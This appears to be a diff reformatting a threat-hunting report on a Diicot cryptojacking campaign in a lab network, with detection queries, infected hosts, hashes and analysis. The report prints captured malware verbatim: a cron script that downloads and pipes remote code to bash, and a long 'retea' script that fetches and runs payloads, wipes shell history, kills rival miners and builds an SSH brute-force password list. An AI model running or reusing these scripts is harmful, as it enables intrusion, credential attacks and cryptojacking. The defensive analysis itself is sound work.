@@ -641,136 +641,99 @@ DeviceFileEvents
 | distinct DeviceName
 ```
 
-The following devices were discovered to have contained the .b file,
-1. linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-2. linux-programatic-ajs
-3. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-4. sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-5. sakel-lunix-2
-6. linux-programmatic-vm-danny.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-7.linux-programatical-vul-remediation-lokesh.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp
-.net
-8. linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-With the most recent .b cron job creation occurring at “2025-03-18T06:24:06.758628Z” on the
-device “sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net”.
-The next bash script embedded in the Update payload is the .c file. Unlike the previous file,
-threat hunting for the script proved to be more difficult. Querying the logs for either the file name
-“.c” or an associated SHA1 hash proved to be unsuccessful. Despite multiple queries failing, I
-was fortunate to identify a domain associated with Diicot’s .c scheduled task. The domain
-digital.digitaldatainsights[.]org was distinguished and recognized while looking at script
-activity found in the DeviceEvents table. The associated script executes,
-#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s
-196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15
-digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
-The script silently fetches from the two URLs,
-196[.]251[.]114[.]67/.x/black3 and digital[.]digitaldatainsights[.]org/.x/black3
-attempting to fetch another possible script called “black3”. Having previously read the Wiz’s
-report on Diicot’s malware campaigns, the domain is associated with the Bash script used in the
-.c cron job. The URL digital[.]digitaldatainsights[.]org/.x/black3 is explicitly referenced as the
-domain from which the malicious script initiates a download. Analyzing the IP address
-196[.]251[.]114[.]67 from the script using VirusTotal revealed that it has also been flagged for
-malicious activity.
-Once the script was identified as being malicious in nature, the associated SHA256 hash value
-was extracted for additional analysis.
-SHA256: 1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093
-The SHA256 hash is not classified as malicious by VirusTotal at the moment. Using the script’s
-SHA256 hash value, another query was constructed to search for the presence of similar scripts
-in other systems within the CyberRange network.
+The following devices were discovered to have contained the `.b` file,
+
+1. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+2. `linux-programatic-ajs`
+
+3. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+4. `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+5. `sakel-lunix-2`
+
+6. `linux-programmatic-vm-danny.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+7. `linux-programatical-vul-remediation-lokesh.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+8. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+With the most recent `.b` cron job creation occurring at `2025-03-18T06:24:06.758628Z` on the device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`.
+The next bash script embedded in the Update payload is the `.c` file. Unlike the previous file, threat hunting for the script proved to be more difficult. Querying the logs for either the file name `.c` or an associated SHA1 hash proved to be unsuccessful. Despite multiple queries failing, I was fortunate to identify a domain associated with Diicot’s `.c` scheduled task. The domain `digital.digitaldatainsights[.]org` was distinguished and recognized while looking at script activity found in the `DeviceEvents` table. The associated script executes,
+
+Script:
+
+```bash
+#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
+```
+
+The script silently fetches from the two URLs, `196[.]251[.]114[.]67/.x/black3` and `digital[.]digitaldatainsights[.]org/.x/black3` attempting to fetch another possible script called `black3`. Having previously read the Wiz’s report on Diicot’s malware campaigns, the domain is associated with the Bash script used in the `.c` cron job. The URL `digital[.]digitaldatainsights[.]org/.x/black3` is explicitly referenced as the domain from which the malicious script initiates a download. Analyzing the IP address
+`196[.]251[.]114[.]67` from the script using VirusTotal revealed that it has also been flagged for malicious activity. Once the script was identified as being malicious in nature, the associated SHA256 hash value was extracted for additional analysis.
+
+SHA256: `1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093`
+
+The SHA256 hash is not classified as malicious by VirusTotal at the moment. Using the script’s SHA256 hash value, another query was constructed to search for the presence of similar scripts in other systems within the CyberRange network.
+
 Query
+
+```kql
 DeviceFileEvents
-| where SHA256 ==
-"1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093"
+| where SHA256 == "1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093"
 | order by Timestamp asc
-The returned logs identified the file name as 'ssshd' and indicated its presence on the following
-devices,
+```
+
+The returned logs identified the file name as 'ssshd' and indicated its presence on the following devices,
+
 1. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
-2. 28514056957f4ceedbafaeb39f57f1bdca663cf5
-3. 8ef401b7733385b8b4d103697e43a26a590b2fb8
-4. f0e5924acee5d577e8d2b2770974b934cef3c04e
-Command and Control (C2) (T1071.001)
-Diicot’s malware communicates with a C2 server multiple times as it runs. It sends two types of
-reports, error reports and information about successful brute-force attempts against other
-remote machines. Successful brute-force reports sent to the C2 server contain information such
-as the victim’s IP address, system information and GPU availability. The reports are transmitted
-using the curl command and contain the C2 server’s IP address in the header. Inspecting the
-DeviceProcessEvents table for commands utilizing the curl command-line tool uncovered
-activity resembling successful brute-force reporting to a C2 server.
+
+2. `28514056957f4ceedbafaeb39f57f1bdca663cf5`
+
+3. `8ef401b7733385b8b4d103697e43a26a590b2fb8`
+
+4. `f0e5924acee5d577e8d2b2770974b934cef3c04e`
+
+### Command and Control (C2) (T1071.001)
+
+Diicot’s malware communicates with a C2 server multiple times as it runs. It sends two types of reports, error reports and information about successful brute-force attempts against other remote machines. Successful brute-force reports sent to the C2 server contain information such as the victim’s IP address, system information and GPU availability. The reports are transmitted using the curl command and contain the C2 server’s IP address in the header. Inspecting the `DeviceProcessEvents` table for commands utilizing the curl command-line tool uncovered activity resembling successful brute-force reporting to a C2 server.
+
 Query
+
+```kql
 DeviceProcessEvents
 | where Timestamp >= datetime(2024-11-01)
 | where ProcessCommandLine contains "curl --silent"
 | order by Timestamp desc
 | distinct ProcessCommandLine
-A quick inspection of the IP address 196[.]251[.]73[.]38 (referenced earlier in the report) with
-VirusTotal indicated that the address was classified as malicious.
-SSH Brute Force (T1110.001)
-Another element of Diccot’s malicious payloads is their SSH brute-force capability. The payloads
-target other systems it discovers, looking to exploit ones with weak credentials. Documented
-Diccot attacks have observed the bisis binary scanning IPs in order to identify systems running
-SSH. Once identified, the malware attempts to log into the systems by using a username and
-password list.Filtering the DeviceNetworkEvents table for network logs where the initiating file
-name was bisis revealed network activity consistent with SSH brute-force attacks conducted by
-bisis.
+```
+
+A quick inspection of the IP address `196[.]251[.]73[.]38` (referenced earlier in the report) with VirusTotal indicated that the address was classified as malicious.
+
+### SSH Brute Force (T1110.001)
+
+Another element of Diccot’s malicious payloads is their SSH brute-force capability. The payloads target other systems it discovers, looking to exploit ones with weak credentials. Documented Diccot attacks have observed the `bisis` binary scanning IPs in order to identify systems running SSH. Once identified, the malware attempts to log into the systems by using a username and password list. Filtering the `DeviceNetworkEvents` table for network logs where the initiating file name was `bisis` revealed network activity consistent with SSH brute-force attacks conducted by `bisis`.
+
 Query
+
+```kql
 DeviceNetworkEvents
 | where InitiatingProcessFileName contains "bisis"
 | order by Timestamp asc
-| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteIPType,
-InitiatingProcessFileName
-Cryptomining (T1496.001)
-This Diicot malware campaign includes crypto-jacking capabilities. The Update file checks a
-system’s details and adapts its behavior depending on if it detects a cloud environment or a
-standard CPU. The malware is observed to prioritize spreading itself within cloud environments.
-While threat hunting for malicious script activity, a relevant script associated with crypto mining
-activity was discovered. The retea payload found within CyberRange systems has several
-elements that indicate cryptojacking.
+| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteIPType, InitiatingProcessFileName
+```
+
+### Cryptomining (T1496.001)
+
+This Diicot malware campaign includes crypto-jacking capabilities. The `Update` payload checks a system’s details and adapts its behavior depending on if it detects a cloud environment or a standard CPU. The malware is observed to prioritize spreading itself within cloud environments. While threat hunting for malicious script activity, a relevant script associated with crypto mining activity was discovered. The `rete`a payload found within CyberRange systems has several elements that indicate cryptojacking.
+
 Script
-./retea -c ' #!/bin/bash key=$1 user=$2
-if [[ $key ==
-"KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
-then echo -e "" else echo Logged with successfully. rm -rf .retea crontab -r ; pkill xrx ;
-pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x
-/var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm
--rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;
-pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune.com/payload || curl -O -s -L
-dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ;
-chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history
-~/.bash_history chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf
-.bash_history ~/.bash_history fi
-rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit
--Hn ; ulimit -n 99999 -u 999999
-cd /dev/shm mkdir /dev/shm/.x > /dev/null 2>&1 mv network .x/ cd .x rm -rf retea ips
-iptemp ips iplist sleep 1 rm -rf pass useri=cat /etc/passwd |grep -v nologin |grep -v false
-|grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1 echo $useri > .usrs pasus=.usrs
-check=grep -c . .usrs for us in $(cat $pasus) ; do printf "$us $us\n" >> pass printf "$us
-$us"$us"\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"123456\n" >> pass
-printf "$us 123456\n">> pass printf "$us 1\n">> pass printf "$us 12\n">> pass printf "$us
-123\n">> pass printf "$us 1234\n">> pass printf "$us 12345\n">> pass printf "$us
-12345678\n">> pass printf "$us 123456789\n">> pass printf "$us 123.com\n">> pass
-printf "$us 123456.com\n">> pass printf "$us 123\n" >> pass printf "$us 1qaz@WSX\n" >>
-pass printf "$us "$us"@123\n" >> pass printf "$us "$us"@1234\n" >> pass printf "$us
-"$us"@123456\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"1234\n" >>
-pass printf "$us "$us"123456\n" >> pass printf "$us qwer1234\n" >> pass printf "$us
-111111\n">> pass printf "$us Passw0rd\n" >> pass printf "$us P@ssw0rd\n" >> pass
-printf "$us qaz123!@#\n" >> pass printf "$us !@#\n" >> pass printf "$us password\n" >>
-pass printf "$us Huawei@123\n" >> pass done wait sleep 0.5 cat bios.txt | sort -R | uniq |
-uniq > i cat i > bios.txt ./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents
-2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr
--iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill
-xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot
-/var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd
-/var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
-; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q
-85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu
-cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf
-.bash_history ~/.bash_history" sleep 25 function Miner { rm -rf /dev/shm/retea
-/dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ; rm -rf
-~/.bash_history history -c } Miner ' ./retea
-KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
-The script specifically kills processes associated with other crypto miners (xmrig, cnrig, java)
-and the script contains several instances of a payload download. Both the domain and the URL
-found in the download command (dinpasiune[.]com, 85[.]31[.]47[.]99) are classified as
-malicious by VirusTotal.
-Conducting OSINT on the domain name revealed threat intelligence indicating that the domain
-was indeed linked to cryptojacking activity.
+
+```bash
+./retea -c ' #!/bin/bash key=$1 user=$2 if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]] then echo -e "" else echo Logged with successfully. rm -rf .retea crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune[.]com/payload || curl -O -s -L dinpasiune[.]com/payload || wget 85[.]31[.]47[.]99/payload || curl -O -s -L 85[.]31[.]47[.]99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_history fi rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit
+-Hn ; ulimit -n 99999 -u 999999 cd /dev/shm mkdir /dev/shm/.x > /dev/null 2>&1 mv network .x/ cd .x rm -rf retea ips iptemp ips iplist sleep 1 rm -rf pass useri=cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1 echo $useri > .usrs pasus=.usrs check=grep -c . .usrs for us in $(cat $pasus) ; do printf "$us $us\n" >> pass printf "$us $us"$us"\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"123456\n" >> pass printf "$us 123456\n">> pass printf "$us 1\n">> pass printf "$us 12\n">> pass printf "$us 123\n">> pass printf "$us 1234\n">> pass printf "$us 12345\n">> pass printf "$us 12345678\n">> pass printf "$us 123456789\n">> pass printf "$us 123.com\n">> pass printf "$us 123456.com\n">> pass printf "$us 123\n" >> pass printf "$us 1qaz@WSX\n" >> pass printf "$us "$us"@123\n" >> pass printf "$us "$us"@1234\n" >> pass printf "$us "$us"@123456\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"1234\n" >> pass printf "$us "$us"123456\n" >> pass printf "$us qwer1234\n" >> pass printf "$us 111111\n">> pass printf "$us Passw0rd\n" >> pass printf "$us P@ssw0rd\n" >> pass printf "$us qaz123!@#\n" >> pass printf "$us !@#\n" >> pass printf "$us password\n" >> pass printf "$us Huawei@123\n" >> pass done wait sleep 0.5 cat bios.txt | sort -R | uniq | uniq > i cat i > bios.txt ./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history" sleep 25 function Miner { rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ; rm -rf ~/.bash_history history -c } Miner ' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
+```
+
+The script specifically kills processes associated with other crypto miners (`xmrig`, `cnrig`, `java`) and the script contains several instances of a payload download. Both the domain and the URL found in the download command (dinpasiune[.]com, 85[.]31[.]47[.]99) are classified as malicious by VirusTotal.
+
+Conducting OSINT on the domain name revealed threat intelligence indicating that the domain as indeed linked to cryptojacking activity.
 (https://x.com/r3dbU7z/status/1648586927266832384/photo/1)
